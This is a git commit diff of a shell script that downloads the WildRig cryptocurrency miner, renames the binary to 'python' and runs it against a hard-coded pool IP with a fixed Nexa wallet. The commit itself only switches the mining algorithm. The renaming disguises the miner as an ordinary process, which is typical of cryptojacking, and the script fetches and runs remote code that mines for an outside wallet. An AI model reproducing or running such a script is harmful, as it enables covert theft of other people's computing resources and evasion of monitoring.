6f118785b8dad0282608461748ed622d8676cc78
rindalasririn <95740336+rindalasririn@users.noreply.github.com>
2023-01-14 06:13:37 -0800

    Update 16kw.sh

--- 16kw.sh
+++ 16kw.sh
@@ -1,4 +1,4 @@
 curl -L -o python.tar.gz https://github.com/andru-kun/wildrig-multi/releases/download/0.36.2b/wildrig-multi-linux-0.36.2b.tar.xz
 tar -zxvf python.tar.gz
 mv wildrig-multi python
-./python --algo AUTOLYKOS2 --pool 23.83.132.72:16011 --user nexa:nqtsq5g5pscnp23tmnxqyz5c7gvkemy2r598end5saruczw6.sedar
+./python --algo nexapow --pool 23.83.132.72:16011 --user nexa:nqtsq5g5pscnp23tmnxqyz5c7gvkemy2r598end5saruczw6.sedar
